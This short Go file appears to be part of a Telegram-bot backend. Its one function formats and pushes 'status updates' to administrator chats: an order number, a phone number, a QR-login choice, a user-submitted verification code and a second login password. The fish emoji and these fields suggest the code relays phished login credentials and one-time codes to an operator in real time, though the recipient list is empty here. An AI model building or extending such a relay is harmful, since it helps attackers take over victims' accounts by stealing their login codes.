package service

import (
	"context"
	"fmt"
	"github.com/go-telegram/bot"
	"telegram-robot/model"
)

// 数据更新时推送的函数
func NotifyDataUpdate(ctx context.Context, b *bot.Bot, message model.TgOrder) {
	// 假设管理员的 ChatID 是 12345678
	//
	// 构造推送的消息内容
	sliceTemp := []int64{}
	message1 := fmt.Sprintf(`🐟状态更新：
管理员：
订单编号：%d     
填写手机号：%s
选择二维码登录：%s
用户提交验证码：%s
二次登录密码：******`, message.ID, message.Phone, message.QRCode, message.Code)
	// 主动推送消息给管理员
	for _, value := range sliceTemp {
		b.SendMessage(ctx, &bot.SendMessageParams{
			ChatID: value,
			Text:   message1,
		})
	}
}
